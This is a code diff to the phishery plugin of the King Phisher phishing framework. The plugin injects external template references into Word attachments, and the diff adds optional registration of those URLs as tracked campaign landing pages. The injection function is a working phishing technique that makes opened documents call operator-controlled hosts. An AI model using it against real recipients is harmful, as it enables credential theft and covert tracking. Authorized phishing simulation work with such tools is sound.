@@ -1,8 +1,9 @@
 import argparse
+import distutils.version
 import os
 import random
+import urllib.parse
 import zipfile
-import distutils.version
 
 import king_phisher.archive as archive
 import king_phisher.client.plugins as plugins
@@ -25,17 +26,17 @@ def path_is_doc_file(path):
 def phishery_inject(input_file, https_url, output_file=None):
 	target_string = '<Relationship Id="{rid}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{target_url}" TargetMode="External"/>'
 	input_file = os.path.abspath(input_file)
-	https_urls = https_url.split()
+	document_urls = https_url.split()
 	rids = []
-	while len(rids) < len(https_urls):
+	while len(rids) < len(document_urls):
 		rid = 'rId' + str(random.randint(10000, 99999))
 		if rid not in rids:
 			rids.append(rid)
 
 	settings = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
 	settings += '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
-	for url in https_urls:
-		settings += target_string.format(rid=rids[https_urls.index(url)], target_url=url)
+	for rid, url in zip(rids, document_urls):
+		settings += target_string.format(rid=rid, target_url=url)
 	settings += '</Relationships>'
 
 	patches = {}
@@ -86,10 +87,16 @@ class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlug
 			default='{{ url.webserver }}',
 			display_name='Target URLs',
 			**({'multiline': True} if api_compatible else {})
+		),
+		plugins.ClientOptionBoolean(
+			'add_landing_pages',
+			'Add all document URLs as landing pages to track visits',
+			default=False,
+			display_name='Add document URLs as landing pages.'
 		)
 	]
 	req_min_version = min_version
-	version = '2.0.2'
+	version = '2.1.0'
 
 	def initialize(self):
 		mailer_tab = self.application.main_tabs['mailer']
@@ -117,6 +124,7 @@ class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlug
 		self.logger.info('wrote the patched file to: ' + output_path + ('' if target is None else ' with uid: ' + target.uid))
 
 	def signal_send_precheck(self, _):
+		rpc = self.application.rpc
 		input_path = self.application.config['mailer.attachment_file']
 		if not path_is_doc_file(input_path):
 			self.text_insert('The attachment is not compatible with the phishery plugin.\n')
@@ -125,6 +133,36 @@ class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlug
 		if target_url is None:
 			self.text_insert('The phishery target URL is invalid.\n')
 			return False
+
+		if not self.config['add_landing_pages']:
+			return True
+		options = {'campaign': self.application.config['campaign_id']}
+		results = rpc.graphql("""\
+			query getCampaignExport($campaign: String!) {
+				db {
+					campaign(id: $campaign) {
+						landingPages {
+							edges {
+								node {
+									id
+									campaignId
+									hostname
+									page
+								}
+							}
+						}
+					}
+				}
+			}""", options)
+		document_urls = target_url.split()
+		landing_pages = [(node['node']['hostname'], node['node']['page']) for node in results['db']['campaign']['landingPages']['edges']]
+		for document_url in document_urls:
+			parsed_url = urllib.parse.urlparse(document_url)
+			hostname = parsed_url.netloc
+			landing_page = parsed_url.path
+			landing_page.lstrip()
+			if (hostname, landing_page) not in landing_pages:
+				self.application.rpc('campaign/landing_page/new', self.application.config['campaign_id'], hostname, landing_page)
 		return True
 
 def main():
